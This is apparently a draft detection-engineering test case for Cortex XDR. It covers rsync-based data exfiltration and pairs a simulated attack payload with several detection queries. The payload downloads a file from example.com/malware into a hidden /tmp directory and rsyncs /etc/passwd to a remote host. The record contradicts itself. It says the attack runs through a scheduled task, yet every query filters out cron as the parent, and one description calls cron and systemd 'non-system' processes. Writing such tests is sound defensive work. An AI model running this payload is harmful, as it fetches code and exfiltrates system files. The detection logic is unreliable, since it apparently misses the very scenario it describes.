identity.description: An attacker uses rsync to exfiltrate data from a compromised Linux system, executing it through a scheduled task to avoid detection. Cortex should detect the unusual rsync process execution and its network activity.

techniques.name: Command and Scripting Interpreter: Unix Shell

payload.code:
mkdir -p /tmp/.cache
wget -O /tmp/.cache/rsync https://example.com/malware
chmod +x /tmp/.cache/rsync
rsync -avz /etc/passwd root@192.0.2.10:/tmp/

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Unpopular rsync process execution
biocs.description: Detection of rsync being executed from an uncommon location or with unusual arguments
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'rsync'
| filter actor_process_image_name != 'cron'
| filter actor_process_image_name != 'systemd'
| filter not action_file_path startswith '/usr/bin/'

abiocs.name: Unusual rsync execution from non-system process
abiocs.description: Detection of rsync being started by a non-system process like cron or systemd, which is unusual for legitimate use
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'rsync'
| filter causality_actor_process_image_name != 'systemd'
| filter causality_actor_process_image_name != 'cron'
| filter causality_actor_process_image_name != 'bash'
| filter causality_actor_process_image_name != 'sh'
abiocs.causality_anchor: rsync process started by non-standard parent

xql_queries.name: Detect rsync execution with non-standard parent
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'rsync'
| filter causality_actor_process_image_name != 'systemd' and causality_actor_process_image_name != 'cron'
| fields agent_hostname, action_process_image_name, causality_actor_process_image_name
